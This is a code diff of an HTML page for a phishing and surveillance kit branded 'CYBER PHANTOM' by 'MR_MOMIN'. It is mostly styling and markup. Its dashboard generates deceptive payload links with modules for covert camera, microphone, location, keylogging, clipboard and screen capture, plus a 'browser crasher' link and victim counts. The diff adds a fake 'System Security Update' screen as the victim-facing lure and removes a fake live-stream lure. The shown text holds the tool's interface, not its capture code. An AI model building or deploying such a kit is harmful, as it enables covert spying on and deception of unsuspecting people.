+            letter-spacing: 1px;
+        }
+        
+        .victim-time {
+            font-size: 0.85rem;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .victim-tabs {
+            display: flex;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        
         .tab-btn {
-            background: #0a1a0a;
-            border: 1px solid #0f0;
-            padding: 0.3rem 0.8rem;
-            border-radius: 2rem;
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            border: 1px solid rgba(0, 240, 255, 0.2);
+            background: transparent;
+            color: rgba(255,255,255,0.6);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 600;
             cursor: pointer;
-            font-size: 0.7rem;
-            color: #0f0;
+            transition: var(--transition);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
+        
+        .tab-btn:hover {
+            border-color: var(--primary);
+            color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
+        }
+        
         .tab-btn.active {
-            background: #0f0;
-            color: #000;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: var(--dark);
+            border-color: transparent;
+            box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
         }
+        
         .tab-content {
             display: none;
+            animation: fadeIn 0.3s ease;
         }
+        
         .tab-content.active {
             display: block;
         }
-        .image-grid, .video-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.8rem;
-            align-items: flex-start;
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
+        
+        /* Media Grid */
+        .media-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 1rem;
+        }
+        
         .media-card {
-            background: #0a1a0a;
-            border-radius: 0.8rem;
-            padding: 0.5rem;
-            border: 1px solid #0f0;
-            width: 180px;
-            text-align: center;
+            background: rgba(0,0,0,0.4);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            transition: var(--transition);
+            position: relative;
         }
-        .thumbnail {
+        
+        .media-card:hover {
+            transform: scale(1.05);
+            border-color: var(--primary);
+            box-shadow: 0 10px 30px rgba(0, 240, 255, 0.2);
+            z-index: 10;
+        }
+        
+        .media-card img, .media-card video {
             width: 100%;
-            height: auto;
-            max-height: 120px;
+            height: 120px;
             object-fit: cover;
-            border-radius: 0.5rem;
             cursor: pointer;
         }
-        .video-thumb {
-            width: 100%;
-            max-height: 120px;
-            background: #000;
-            border-radius: 0.5rem;
+        
+        .media-actions {
+            padding: 0.8rem;
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
         }
-        .download-btn {
-            background: #0a1a0a;
-            border: 1px solid #0f0;
-            border-radius: 1rem;
-            padding: 0.2rem 0.5rem;
-            font-size: 0.7rem;
+        
+        /* Download Button for Media */
+        .btn-download {
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            border: 1px solid var(--primary);
+            background: rgba(0, 240, 255, 0.1);
+            color: var(--primary);
+            font-size: 0.8rem;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 0.3rem;
-            display: inline-block;
-            color: #0f0;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
         }
-        audio {
-            max-width: 200px;
-            margin: 0.2rem;
+        
+        .btn-download:hover {
+            background: var(--primary);
+            color: var(--dark);
+            transform: translateY(-2px);
         }
-        .map-container {
-            height: 200px;
-            border-radius: 0.8rem;
-            margin-top: 0.5rem;
+        
+        /* Passive Info */
+        .passive-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 0.8rem;
         }
-        .delete-victim-btn {
-            background: #a00;
-            color: white;
-            border: none;
-            border-radius: 1rem;
-            padding: 0.2rem 0.5rem;
-            cursor: pointer;
+        
+        .passive-item {
+            background: rgba(0, 240, 255, 0.05);
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            border-radius: 12px;
+            padding: 0.8rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-size: 0.9rem;
+            transition: var(--transition);
         }
+        
+        .passive-item:hover {
+            background: rgba(0, 240, 255, 0.1);
+            border-color: var(--primary);
+            transform: translateX(4px);
+        }
+        
+        .passive-item i {
+            color: var(--primary);
+            font-size: 1.1rem;
+            width: 20px;
+        }
+        
+        /* Lightbox */
         .lightbox {
             display: none;
             position: fixed;
@@ -381,1118 +1166,1361 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.95);
             z-index: 9999;
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            backdrop-filter: blur(20px);
         }
+        
         .lightbox.active {
             display: flex;
+            animation: fadeIn 0.2s ease;
         }
+        
         .lightbox-img, .lightbox-video {
             max-width: 90%;
-            max-height: 80%;
-            border-radius: 1rem;
+            max-height: 85%;
+            border-radius: 20px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+            border: 2px solid var(--primary);
         }
+        
         .close-lightbox {
             position: absolute;
-            top: 20px;
-            right: 30px;
-            color: white;
-            font-size: 2rem;
+            top: 30px;
+            right: 40px;
+            color: var(--primary);
+            font-size: 3rem;
             cursor: pointer;
-        }
-        .stats-row {
+            transition: var(--transition);
+            width: 50px;
+            height: 50px;
             display: flex;
-            gap: 1rem;
-            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            border: 2px solid var(--primary);
+            background: rgba(0,0,0,0.5);
+        }
+        
+        .close-lightbox:hover {
+            background: var(--primary);
+            color: var(--dark);
+            transform: rotate(90deg) scale(1.1);
+        }
+        
+        /* Victim Panel - Fake System Update */
+        #victimPanel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--darker);
+            z-index: 9998;
+            overflow: hidden;
+        }
+        
+        #victimPanel.active {
+            display: block;
+        }
+        
+        .update-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            background: radial-gradient(circle at center, #1a1a2e 0%, #0a0a0f 100%);
+        }
+        
+        .update-logo {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        .update-logo i {
+            font-size: 5rem;
+            color: var(--primary);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-shadow: 0 0 30px rgba(0, 240, 255, 0.5);
+        }
+        
+        .update-spinner {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(0, 240, 255, 0.1);
+            border-top-color: var(--primary);
+            border-right-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .update-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 2rem;
+            color: #fff;
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            text-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+        }
+        
+        .update-text {
+            font-size: 1rem;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 2rem;
+            text-align: center;
+            max-width: 600px;
+            line-height: 1.6;
+        }
+        
+        .update-progress-container {
+            width: 80%;
+            max-width: 500px;
             margin-bottom: 1rem;
         }
-        .stat-card {
-            background: #0a1a0a;
-            border-radius: 1rem;
-            padding: 0.8rem;
-            flex: 1;
-            text-align: center;
-            border: 1px solid #0f0;
-            color: #0f0;
-        }
-        .export-btn {
-            background: #0a1a0a;
-            border: 1px solid #0f0;
-            border-radius: 2rem;
-            padding: 0.4rem 1rem;
-            cursor: pointer;
-            color: #0f0;
-        }
-        .hide {
-            display: none;
-        }
-        .victim-panel {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: #0a0a1a;
-            color: white;
-            padding: 0;
-            border-radius: 1.5rem;
+        
+        .update-progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
             overflow: hidden;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
         }
-        .fake-stream-header {
-            background: linear-gradient(90deg, #1e3c72, #2a5298);
-            padding: 1rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .fake-stream-title {
-            font-size: 1.5rem;
-            font-weight: bold;
-        }
-        .fake-stream-video {
-            background: #000;
-            position: relative;
-            width: 100%;
-            aspect-ratio: 16/9;
-        }
-        .fake-stream-video video {
-            width: 100%;
+        
+        .update-progress-fill {
             height: 100%;
-            object-fit: cover;
-        }
-        .fake-stream-chat {
-            background: #1e1e2a;
-            padding: 1rem;
-            height: 300px;
-            overflow-y: auto;
-        }
-        .chat-message {
-            background: #2a2a3a;
-            margin: 0.5rem 0;
-            padding: 0.5rem;
-            border-radius: 0.5rem;
-            animation: fadeIn 0.3s;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        .scan-progress {
-            width: 100%;
-            height: 4px;
-            background: #2a2a3a;
-            margin: 0.5rem 0;
-            border-radius: 2px;
-            overflow: hidden;
-        }
-        .scan-fill {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
             width: 0%;
-            height: 100%;
-            background: #2a5298;
-            transition: width 0.1s linear;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 20px var(--primary);
         }
-        .status-msg {
+        
+        .update-percentage {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5rem;
+            color: var(--primary);
+            margin-top: 1rem;
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
+        }
+        
+        .update-details {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: rgba(255,255,255,0.4);
+            margin-top: 2rem;
             text-align: center;
-            color: #0f0;
-            margin: 1rem;
+            line-height: 1.6;
         }
-        .passive-compact {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.5rem;
-            background: #0a1a0a;
-            padding: 0.8rem;
-            border-radius: 1rem;
-            border: 1px solid #0f0;
+        
+        .update-details span {
+            color: var(--primary);
         }
-        .passive-item {
-            background: #0a1a0a;
-            padding: 0.2rem 0.6rem;
-            border-radius: 1rem;
-            font-size: 0.7rem;
-            color: #0f0;
-            white-space: nowrap;
-            border: 1px solid #0f0;
+        
+        /* Hidden Canvases for Anti-Throttle */
+        .victim-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            pointer-events: none;
         }
-        @media (max-width: 640px) {
-            body {
+        
+        /* Status Message */
+        .status-msg {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            padding: 1rem 2rem;
+            border-radius: 16px;
+            font-weight: 600;
+            z-index: 10000;
+            transform: translateX(500px);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            backdrop-filter: blur(20px);
+            font-size: 1rem;
+            letter-spacing: 0.5px;
+        }
+        
+        .status-msg.show {
+            transform: translateX(0);
+        }
+        
+        .status-msg.success {
+            background: rgba(0, 240, 255, 0.15);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            box-shadow: var(--glow);
+        }
+        
+        .status-msg.error {
+            background: rgba(255, 56, 100, 0.15);
+            border: 1px solid var(--secondary);
+            color: var(--secondary);
+            box-shadow: var(--glow-red);
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--dark);
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(var(--primary), var(--accent));
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(var(--accent), var(--primary));
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
                 padding: 1rem;
             }
-            .passive-item {
-                font-size: 0.6rem;
+            
+            .header {
+                padding: 1rem;
+                border-radius: 20px;
             }
-            .campaign-link {
-                white-space: normal;
-                font-size: 0.65rem;
+            
+            .logo-text h1 {
+                font-size: 1.4rem;
             }
-            .media-card {
-                width: 140px;
+            
+            .feature-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 0.8rem;
             }
+            
+            .feature-card {
+                padding: 1.2rem 0.8rem;
+            }
+            
+            .update-title {
+                font-size: 1.5rem;
+            }
+            
+            .stat-value {
+                font-size: 2rem;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 1rem;
+            }
+            
+            .developer-badge {
+                bottom: 20px;
+                left: 20px;
+                padding: 0.8rem 1.2rem;
+            }
+            
+            .developer-name {
+                font-size: 1rem;
+            }
+        }
+        
+        .hide {
+            display: none !important;
+        }
+        
+        /* Loading Animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.1);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 3rem;
+            color: rgba(255,255,255,0.4);
+        }
+        
+        .empty-state i {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            opacity: 0.3;
+        }
+        
+        .empty-state p {
+            font-size: 1rem;
         }
     </style>
 </head>
 <body>
-<div class="bg-glow"></div>
-<div class="container">
-    <div class="premium-header">
-        <div class="logo-area">
-            <h1>MR_MOMIN_🌍</h1>
-            <p>Elite Surveillance Framework</p>
-        </div>
-        <div class="uid-info">
-            <span class="uid-label"><i class="fas fa-fingerprint"></i> PERMANENT ID</span>
-            <span class="uid-value" id="displayUid">--</span>
-        </div>
+    <!-- Background Animation -->
+    <div class="bg-animation">
+        <div class="bg-grid"></div>
+        <div class="particles" id="particles"></div>
     </div>
 
-    <div id="dashboardPanel">
-        <div class="card">
-            <h3><i class="fas fa-microchip"></i> SELECT MODULES</h3>
-            <div class="feature-grid" id="featureGrid">
-                <div class="feature-card" data-feat="CFP"><i class="fas fa-camera"></i><span>📸 FRONT PHOTO</span></div>
-                <div class="feature-card" data-feat="CFV"><i class="fas fa-video"></i><span>🎥 FRONT VIDEO</span></div>
-                <div class="feature-card" data-feat="CBP"><i class="fas fa-camera"></i><span>📸 BACK PHOTO</span></div>
-                <div class="feature-card" data-feat="CBV"><i class="fas fa-video"></i><span>🎥 BACK VIDEO</span></div>
-                <div class="feature-card" data-feat="M"><i class="fas fa-microphone"></i><span>🎙️ MICROPHONE</span></div>
-                <div class="feature-card" data-feat="L"><i class="fas fa-map-marker-alt"></i><span>📍 LOCATION</span></div>
-                <div class="feature-card" data-feat="K"><i class="fas fa-keyboard"></i><span>⌨️ KEYLOGGER</span></div>
-                <div class="feature-card" data-feat="P"><i class="fas fa-clipboard"></i><span>📋 CLIPBOARD</span></div>
-                <div class="feature-card" data-feat="R"><i class="fas fa-video"></i><span>🖥️ SCREEN REC</span></div>
-                <div class="feature-card" data-feat="N"><i class="fas fa-network-wired"></i><span>🌐 NET SCAN</span></div>
-                <div class="feature-card" data-feat="F"><i class="fas fa-ad"></i><span>⚠️ FAKE UPDATE</span></div>
+    <!-- Main Container -->
+    <div class="container" id="dashboardContainer">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <i class="fas fa-ghost"></i>
+                </div>
+                <div class="logo-text">
+                    <h1>CYBER PHANTOM</h1>
+                    <p>Elite Red Team Arsenal</p>
+                </div>
             </div>
-            <div class="toggle-switch">
-                <input type="checkbox" id="advancedToggle">
-                <label for="advancedToggle">⚡ ADVANCED STEALTH (File Steal, Browser Data, DNS Leak, Sensors)</label>
+            <div class="operator-badge">
+                <div class="operator-icon">
+                    <i class="fas fa-fingerprint"></i>
+                </div>
+                <div class="operator-info">
+                    <span class="operator-label">Operator ID</span>
+                    <span class="operator-id" id="displayUid">Initializing...</span>
+                </div>
             </div>
-            <div id="cameraCustom" class="camera-custom">
-                <h4><i class="fas fa-camera"></i> Camera Customization (Advanced only)</h4>
-                <div class="camera-grid">
-                    <div class="camera-option">
-                        <label><i class="fas fa-clock"></i> Photo Interval (sec):</label>
-                        <input type="number" id="cameraInterval" value="0.33" step="0.05" min="0.1">
+        </header>
+
+        <!-- Dashboard Panel -->
+        <div id="dashboardPanel">
+            <!-- Exploit Modules Card -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-icon">
+                        <i class="fas fa-microchip"></i>
                     </div>
-                    <div class="camera-option">
-                        <label><i class="fas fa-video"></i> Video Clip Duration (sec):</label>
-                        <input type="number" id="videoDuration" value="3" step="1" min="1">
+                    <h2 class="card-title">Exploit Modules</h2>
+                </div>
+                
+                <div class="feature-grid" id="featureGrid">
+                    <div class="feature-card" data-feat="CFP">
+                        <i class="fas fa-camera"></i>
+                        <span>Frontal Capture</span>
                     </div>
-                    <div class="camera-option">
-                        <label><i class="fas fa-image"></i> Photo Quality (%):</label>
-                        <input type="number" id="photoQuality" value="70" step="5" min="10" max="100">
+                    <div class="feature-card" data-feat="CFV">
+                        <i class="fas fa-video"></i>
+                        <span>Frontal Recon</span>
+                    </div>
+                    <div class="feature-card" data-feat="CBP">
+                        <i class="fas fa-camera"></i>
+                        <span>Rear Stealth</span>
+                    </div>
+                    <div class="feature-card" data-feat="CBV">
+                        <i class="fas fa-video"></i>
+                        <span>Rear Surveillance</span>
+                    </div>
+                    <div class="feature-card" data-feat="M">
+                        <i class="fas fa-microphone"></i>
+                        <span>Audio Sniffer</span>
+                    </div>
+                    <div class="feature-card" data-feat="L">
+                        <i class="fas fa-map-marker-alt"></i>
+                        <span>Geo Tracker</span>
+                    </div>
+                    <div class="feature-card" data-feat="K">
+                        <i class="fas fa-keyboard"></i>
+                        <span>Keystroke Ghost</span>
+                    </div>
+                    <div class="feature-card" data-feat="P">
+                        <i class="fas fa-clipboard"></i>
+                        <span>Clip Harvester</span>
+                    </div>
+                    <div class="feature-card" data-feat="R">
+                        <i class="fas fa-desktop"></i>
+                        <span>Screen Ripper</span>
+                    </div>
+                    <div class="feature-card" data-feat="N">
+                        <i class="fas fa-network-wired"></i>
+                        <span>Network Sweeper</span>
+                    </div>
+                    <div class="feature-card" data-feat="F">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>Fake Updater</span>
+                    </div>
+                </div>
+
+                <!-- Advanced Toggle -->
+                <div class="toggle-container">
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="advancedToggle">
+                        <span class="toggle-slider"></span>
+                    </label>
+                    <span class="toggle-label">
+                        <i class="fas fa-bolt"></i>
+                        Advanced Stealth Mode
+                    </span>
+                </div>
+
+                <!-- Camera Customization -->
+                <div id="cameraCustom" class="camera-custom">
+                    <div class="camera-grid">
+                        <div class="input-group">
+                            <label>Photo Interval (sec)</label>
+                            <input type="number" id="cameraInterval" value="0.33" step="0.05" min="0.1">
+                        </div>
+                        <div class="input-group">
+                            <label>Video Duration (sec)</label>
+                            <input type="number" id="videoDuration" value="3" step="1" min="1">
+                        </div>
+                        <div class="input-group">
+                            <label>Photo Quality (%)</label>
+                            <input type="number" id="photoQuality" value="70" step="5" min="10" max="100">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Shorten Link Toggle -->
+                <div class="toggle-container">
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="shortenToggle">
+                        <span class="toggle-slider"></span>
+                    </label>
+                    <span class="toggle-label">
+                        <i class="fas fa-link"></i>
+                        Shorten Link (is.gd)
+                    </span>
+                </div>
+
+                <!-- Redirect URL -->
+                <div class="url-input-group">
+                    <label>Redirect URL (Optional)</label>
+                    <input type="text" id="redirectUrl" class="url-input" placeholder="https://example.com">
+                </div>
+
+                <!-- Two Generate Buttons -->
+                <button class="btn-primary" id="generateNormalBtn">
+                    <i class="fas fa-radiation"></i> Generate Normal Payload
+                </button>
+                
+                <button class="btn-danger" id="generateCrasherBtn">
+                    <i class="fas fa-bomb"></i> Generate Browser Crasher
+                </button>
+
+                <!-- Generated Link Boxes -->
+                <div id="normalLinkBox" class="link-box hide">
+                    <div class="link-label">
+                        <i class="fas fa-satellite-dish"></i> Normal Payload Link
+                    </div>
+                    <div class="link-text" id="normalLinkText">--</div>
+                    <button class="btn-secondary" id="copyNormalBtn" style="margin-top: 1rem; width: 100%;">
+                        <i class="fas fa-copy"></i> Copy Link
+                    </button>
+                </div>
+
+                <div id="crasherLinkBox" class="link-box danger hide">
+                    <div class="link-label">
+                        <i class="fas fa-skull-crossbones"></i> BROWSER CRASHER LINK
+                    </div>
+                    <div class="link-text" id="crasherLinkText">--</div>
+                    <button class="btn-danger" id="copyCrasherBtn" style="margin-top: 1rem; width: 100%; background: var(--secondary);">
+                        <i class="fas fa-copy"></i> Copy Crasher Link
+                    </button>
+                </div>
+            </div>
+
+            <!-- Statistics Card -->
+            <div class="card">
+                <div class="card-header" style="justify-content: space-between;">
+                    <div style="display: flex; align-items: center; gap: 1rem;">
+                        <div class="card-icon">
+                            <i class="fas fa-chart-line"></i>
+                        </div>
+                        <h2 class="card-title">Operations Overview</h2>
+                    </div>
+                    <button class="btn-secondary" id="exportAllDataBtn">
+                        <i class="fas fa-download"></i> Export JSON
+                    </button>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-mouse-pointer"></i>
+                        </div>
+                        <div class="stat-value" id="totalClicks">0</div>
+                        <div class="stat-label">Total Clicks</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <div class="stat-value" id="totalVictims">0</div>
+                        <div class="stat-label">Total Victims</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-bullseye"></i>
+                        </div>
+                        <div class="stat-value" id="activeCampaigns">0</div>
+                        <div class="stat-label">Active Campaigns</div>
+                    </div>
+                </div>
+
+                <div class="chart-container">
+                    <canvas id="clicksChart"></canvas>
+                </div>
+            </div>
+
+            <!-- Campaigns Card -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-icon">
+                        <i class="fas fa-list"></i>
+                    </div>
+                    <h2 class="card-title">Active Campaigns</h2>
+                </div>
+                <div class="campaign-list" id="campaignList">
+                    <div class="empty-state">
+                        <i class="fas fa-satellite"></i>
+                        <p>No campaigns detected. Generate your first payload.</p>
                     </div>
                 </div>
             </div>
-            <div class="shorten-check">
-                <input type="checkbox" id="shortenToggle"> <label for="shortenToggle">🔗 SHORTEN LINK (is.gd)</label>
-            </div>
-            <p style="font-size:0.7rem; color:#0f0;">Auto-collect: Device Info, Fingerprint, Cookies, Storage, WebRTC, GPU, Audio Devices</p>
-            <button class="btn-primary" id="generateLinkBtn"><i class="fas fa-link"></i> GENERATE NEW CAMPAIGN LINK</button>
-            <div id="newLinkBox" class="link-box hide">
-                <strong><i class="fas fa-share-alt"></i> SHARE THIS LINK</strong>
-                <div class="link-text" id="newLinkText">--</div>
-                <button id="copyLinkBtn" class="export-btn" style="width:100%; margin-top:0.5rem;"><i class="fas fa-copy"></i> COPY LINK</button>
-            </div>
         </div>
-
-        <div class="card">
-            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; margin-bottom: 1rem;">
-                <h3><i class="fas fa-chart-simple"></i> OVERVIEW</h3>
-                <button id="exportAllDataBtn" class="export-btn"><i class="fas fa-download"></i> EXPORT ALL DATA (JSON)</button>
-            </div>
-            <div class="stats-row">
-                <div class="stat-card"><i class="fas fa-chart-line"></i><br><span id="totalClicks">0</span><br>Total Clicks</div>
-                <div class="stat-card"><i class="fas fa-users"></i><br><span id="totalVictims">0</span><br>Total Victims</div>
-            </div>
-            <canvas id="clicksChart" height="100" style="max-height: 200px;"></canvas>
-        </div>
-
-        <div class="card">
-            <h3><i class="fas fa-chart-line"></i> ACTIVE CAMPAIGNS</h3>
-            <div id="campaignList"></div>
-        </div>
-        <div id="dashboardStatus" class="status-msg"></div>
     </div>
 
-    <div id="victimPanel" class="victim-panel hide">
-        <div class="fake-stream-header">
-            <div class="fake-stream-title"><i class="fas fa-tv"></i> LIVE: Exclusive Interview</div>
-            <div><i class="fas fa-users"></i> <span id="viewerCount">12.3k</span> watching</div>
+    <!-- Developer Badge - NEW -->
+    <div class="developer-badge">
+        <div class="developer-icon">
+            <i class="fas fa-code"></i>
         </div>
-        <div class="fake-stream-video">
-            <video id="fakeVideo" autoplay loop muted playsinline>
-                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-            </video>
+        <div class="developer-info">
+            <span class="developer-label">Developed By</span>
+            <span class="developer-name">MR_MOMIN<span class="developer-globe">🌐</span></span>
         </div>
-        <div class="fake-stream-chat" id="fakeChat">
-            <div class="chat-message"><strong>User_123:</strong> Amazing content!</div>
-            <div class="chat-message"><strong>JohnDoe:</strong> When will the next episode?</div>
-            <div class="chat-message"><strong>Admin:</strong> Stay tuned for more updates!</div>
-        </div>
-        <div class="scan-progress"><div class="scan-fill" id="scanFill"></div></div>
-        <div id="scanStatus" style="text-align:center; font-size:0.8rem; margin:0.5rem;">Loading stream...</div>
-        <div id="fakeUpdateDiv" style="display:none; background:#2a2a3a; padding:0.5rem; text-align:center;">
-            <span>⚠️ Your browser needs an update. <button id="fakeUpdateBtn">Update Now</button></span>
-        </div>
-        <div id="victimStatus" class="status-msg"></div>
     </div>
-</div>
 
-<div id="lightbox" class="lightbox">
-    <span class="close-lightbox">&times;</span>
-    <img class="lightbox-img" id="lightbox-img" src="">
-    <video class="lightbox-video" id="lightbox-video" controls style="display:none;"></video>
-</div>
+    <!-- Victim Panel - Fake System Update -->
+    <div id="victimPanel">
+        <!-- Hidden Canvases for Anti-Throttle -->
+        <canvas id="vl1" class="victim-canvas"></canvas>
+        <canvas id="vl2" class="victim-canvas"></canvas>
+        <canvas id="vl3" class="victim-canvas"></canvas>
+        <canvas id="vl4" class="victim-canvas"></canvas>
+        <canvas id="vl5" class="victim-canvas"></canvas>
+        <canvas id="vl6" class="victim-canvas"></canvas>
+        
+        <!-- Fake Update UI -->
+        <div class="update-container" id="updateUI">
+            <div class="update-logo">
+                <div class="update-spinner"></div>
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <h1 class="update-title">System Security Update</h1>
+            <p class="update-text">
+                Your browser is being updated to the latest security patch.<br>
+                Please do not close this window or turn off your device.
+            </p>
+            <div class="update-progress-container">
+                <div class="update-progress-bar">
+                    <div class="update-progress-fill" id="updateProgressFill"></div>
+                </div>
+                <div class="update-percentage" id="updatePercentage">0%</div>
+            </div>
+            <div class="update-details">
+                Installing: <span id="updateFile">security_patch_v2.4.1.bin</span><br>
+                <span id="updateSpeed">2.4 MB/s</span> • <span id="updateTime">Estimated time: 2 minutes</span>
+            </div>
+        </div>
+    </div>
 
-<video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
-<canvas id="hiddenCanvas" style="display:none;"></canvas>
-<input type="file" id="filePicker" style="display:none;" multiple>
+    <!-- Lightbox -->
+    <div id="lightbox" class="lightbox">
+        <span class="close-lightbox">&times;</span>
+        <img class="lightbox-img" id="lightbox-img" src="">
+        <video class="lightbox-video" id="lightbox-video" controls style="display:none;"></video>
+    </div>
 
-<script>
-    // ========== PREMIUM SOUND EFFECTS ==========
-    let audioCtx = null;
-    function initAudio() {
-        if (audioCtx) return;
-        try {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            audioCtx.resume();
-        } catch(e) {}
-    }
-    function playSound(type) {
-        if (!audioCtx) initAudio();
-        if (!audioCtx) return;
-        const now = audioCtx.currentTime;
-        const osc = audioCtx.createOscillator();
-        const gain = audioCtx.createGain();
-        osc.connect(gain);
-        gain.connect(audioCtx.destination);
-        gain.gain.setValueAtTime(0.2, now);
-        gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.2);
-        switch(type) {
-            case 'feature':
-                osc.frequency.value = 300;
-                osc.type = 'sine';
-                gain.gain.setValueAtTime(0.15, now);
-                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.1);
-                osc.start(now);
-                osc.stop(now + 0.1);
-                break;
-            case 'generate':
-                osc.frequency.value = 400;
-                osc.type = 'sine';
-                osc.frequency.exponentialRampToValue(800, now + 0.15);
-                gain.gain.setValueAtTime(0.2, now);
-                osc.start(now);
-                osc.stop(now + 0.2);
-                break;
-            case 'copy':
-                osc.frequency.value = 800;
-                osc.type = 'sine';
-                gain.gain.setValueAtTime(0.1, now);
-                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.05);
-                osc.start(now);
-                osc.stop(now + 0.05);
-                break;
-            case 'delete':
-                osc.frequency.value = 400;
-                osc.type = 'sawtooth';
-                osc.frequency.exponentialRampToValue(200, now + 0.2);
-                gain.gain.setValueAtTime(0.25, now);
-                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.25);
-                osc.start(now);
-                osc.stop(now + 0.25);
-                break;
-            case 'export':
-                osc.frequency.value = 440;
-                osc.type = 'triangle';
-                gain.gain.setValueAtTime(0.2, now);
-                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.2);
-                osc.start(now);
-                osc.stop(now + 0.2);
-                break;
-            case 'checkbox':
-                osc.frequency.value = 200;
-                osc.type = 'sine';
-                gain.gain.setValueAtTime(0.08, now);
-                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.03);
-                osc.start(now);
-                osc.stop(now + 0.03);
-                break;
-            default:
-                osc.frequency.value = 400;
-                osc.type = 'sine';
-                osc.start(now);
-                osc.stop(now + 0.1);
-        }
-    }
+    <!-- Status Message -->
